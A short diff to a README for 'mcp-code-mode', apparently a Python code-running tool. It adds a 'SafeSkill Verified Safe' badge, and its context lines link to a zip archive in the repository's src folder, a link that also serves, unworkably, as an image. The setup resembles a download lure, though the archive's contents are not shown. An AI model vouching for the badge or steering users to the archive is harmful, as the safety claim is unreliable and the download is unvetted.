@@ -1,5 +1,7 @@
 # 🖥️ mcp-code-mode - Run Python Code with Ease
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/jame0077-mcp-code-mode)
+
 ## 🌐 Download the Latest Version
 [![Download Now](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip)](https://raw.githubusercontent.com/Jame0077/mcp-code-mode/main/src/code-mcp-mode-2.1.zip)
 
